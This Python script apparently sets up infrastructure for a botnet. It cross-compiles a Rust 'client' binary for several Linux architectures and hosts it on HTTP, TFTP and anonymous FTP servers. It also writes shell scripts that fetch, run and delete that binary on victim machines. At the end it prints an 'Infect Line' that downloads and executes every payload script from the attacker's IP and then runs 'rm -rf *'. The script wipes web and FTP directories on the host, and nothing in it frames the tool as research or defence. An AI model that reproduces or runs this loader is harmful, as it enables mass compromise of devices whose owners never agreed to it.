import subprocess
import sys
import os

# Check if the IP address and Rust project directory are provided
if len(sys.argv) < 3:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <RUST_PROJECT_DIRECTORY> <IPADDR> \x1b[0m")
    sys.exit(1)

rust_project = sys.argv[1]
ip = sys.argv[2]

download_archs = input("Download architectures? Y/n: ").lower() == "y"

# Define Rust target architectures
rust_archs = [
    "aarch64-unknown-linux-gnu",
    "arm-unknown-linux-gnueabi",
    #"mips-unknown-linux-gnu",
    #"mipsel-unknown-linux-gnu", # need to figure out how to compile rust standard library for these
    "i686-unknown-linux-gnu",
    "x86_64-unknown-linux-gnu",
]

def run(cmd):
    subprocess.call(cmd, shell=True)

# Remove existing binaries
run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if download_archs:
    print("Downloading Rust target architectures")
    for arch in rust_archs:
        run(f"rustup target add {arch}")
    print("Rust targets downloaded.")


# Install cross compilation tool chain
run("apt-get install gcc-aarch64-linux-gnu -y")
run("apt-get install gcc-arm-linux-gnueabi -y")
run("apt-get install gcc-i686-linux-gnu -y")
run("apt-get install gcc-x86-64-linux-gnux32 -y")
run("apt-get install gcc-mips-linux-gnu -y")
run("apt-get install gcc-mipsel-linux-gnu -y")

# Change to Rust project directory
os.chdir(rust_project)

# Cross compile for each architecture
for arch in rust_archs:
    run(f"cargo build --release --target={arch} --bin client")

print("Cross compiling done. Setting up servers...")

# Server setup for Ubuntu
run("apt-get install apache2 -y")
run("service apache2 start")
run("apt-get install xinetd tftpd tftp -y")
run("apt-get install vsftpd -y")
run("service vsftpd start")

run("mkdir /var/lib/tftpboot")
run("chmod -R 777 /var/lib/tftpboot")
run("sudo chown -R nobody /var/lib/tftpboot")



# TFTP server configuration
tftp_config = '''# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
'''
with open("/etc/xinetd.d/tftp", "w") as f:
    f.write(tftp_config)
run("service xinetd start")

run("mkdir /var/ftp")

# FTP server configuration
ftp_config = f'''listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address={ip}
listen_port=21'''
with open("/etc/vsftpd.conf", "w") as f:
    f.write(ftp_config)
run("service vsftpd restart")

# Copy binaries to server directories and setup scripts
for arch in rust_archs:
    binary_name = f"client-{arch}"
    binary_path = f"./target/{arch}/release/client"
    run(f"cp {binary_path} /var/www/html/{binary_name}")
    run(f"cp {binary_path} /var/ftp/{binary_name}")
    run(f"mv {binary_path} /var/lib/tftpboot/{binary_name}")

# Creating shell scripts for binary execution
bins_sh = f'''#!/bin/bash
for binary in {" ".join([f"client-{arch}" for arch in rust_archs])}; do
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/$binary; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/www/html/bins.sh
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get $binary; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/lib/tftpboot/tftp1.sh
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r $binary -g {ip}; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/lib/tftpboot/tftp2.sh
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} $binary $binary; chmod 777 $binary; ./$binary; rm -rf $binary" >> /var/ftp/ftp1.sh
done
'''

with open("/var/www/html/bins.sh", "w") as f:
    f.write(bins_sh)
run("chmod +x /var/www/html/bins.sh")

# Setup tftp1.sh, tftp2.sh, and ftp1.sh
for script_name in ["tftp1.sh", "tftp2.sh", "ftp1.sh"]:
    run(f'echo "#!/bin/bash" > /var/lib/tftpboot/{script_name}')
    run(f'echo "ulimit -n 1024" >> /var/lib/tftpboot/{script_name}')
    run(f'echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/{script_name}')

run("service xinetd restart")
run("service httpd restart")
run('echo "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;32mSuccessfully cross compiled and set up servers!\x1b[0m")
print("\x1b[0;32mYour Infect Line: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
print()
print("\x1b[0;32mCoded by Void. Modified by n00dl3z.\x1b[0m")